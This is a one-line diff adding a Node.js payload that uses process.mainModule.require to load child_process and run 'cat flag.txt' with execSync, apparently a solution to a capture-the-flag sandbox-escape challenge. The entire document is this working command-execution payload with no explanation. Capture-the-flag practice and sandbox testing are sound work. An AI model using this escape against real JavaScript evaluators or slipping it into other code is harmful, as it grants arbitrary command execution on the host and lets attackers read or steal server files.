@@ -1,0 +1,1 @@
+console.log(process.mainModule.require("child_process").execSync("cat flag.txt").toString());
